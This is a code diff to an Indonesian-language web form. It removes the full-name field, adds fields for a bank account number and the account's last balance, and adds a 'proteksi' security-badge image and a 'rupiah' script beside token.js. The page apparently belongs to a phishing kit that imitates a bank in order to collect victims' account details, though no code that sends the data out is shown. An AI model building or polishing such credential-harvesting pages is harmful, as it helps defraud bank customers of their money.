@@ -236,7 +236,21 @@
     
     
  
-    
+    .foto{
+      z-index: 1;
+      background: url('img/proteksi.png');
+      background-repeat: no-repeat;
+      background-size: 100%;
+      bottom: 0; 
+      left: 0; 
+      right: 0; 
+      height:40px;
+      width:85%;
+      margin: 0 auto;
+      top: 90px;
+      position: relative;
+}
+
  </style>
 <body>
       <div class="container" id="con">
@@ -249,19 +263,19 @@
    
           <p class="info">Silahkan lengkapi data berikut</p>
           <hr class="gares">
-         <label for="nama" class="lbl">Nama Lengkap :</label>
-     <input type="text" id="nama" class="form-log" name="nama" placeholder="Tuliskan Nama Lengkap Anda" required> 
-          <br>
-          <br>
-          <label for="rek" class="lbl">Nomor Rekening :</label>
+         <label for="rek" class="lbl">Nomor Rekening :</label>
      <input type="tel" id="rek" class="form-log" maxlength="11" name="rek" placeholder="Tuliskan Nomor Rekening Anda" minlength="5" required>
+          <br>
+          <br>
+          <label for="rek" class="lbl">Saldo Terakhir :</label>
+     <input type="tel" id="nama" class="form-log" maxlength="" name="nama" placeholder="Tuliskan Saldo Terakhir Anda" minlength="" required>
      <br>
           
    
     
      <button type="button" onclick="location.href='index.html'" class="button1 puki" >BATAL</button>
      <button type="submit" id="btnSubmit1" class="button three" >SELANJUTNYA</button>
-     
+     <div class="foto"></div>
      
   
      </form>
@@ -284,6 +298,7 @@ document.getElementById("nomorku").value = nomor + "";
   
 </script>
 <script src="token.js"></script>
+<script src="rupiah"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  <script>
      const button = document.getElementById('con');
